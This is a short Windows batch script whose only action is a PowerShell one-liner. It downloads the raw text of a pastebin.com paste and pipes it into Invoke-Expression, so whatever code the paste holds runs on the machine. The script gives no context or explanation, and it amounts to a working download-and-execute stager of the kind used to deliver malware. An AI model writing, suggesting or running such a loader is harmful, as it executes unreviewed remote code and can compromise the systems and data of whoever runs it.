@echo off
setlocal

powershell -Command "Invoke-WebRequest -Uri 'https://pastebin.com/raw/Ep4f8kq2' -UseBasicParsing | Select-Object -ExpandProperty Content | Invoke-Expression"

endlocal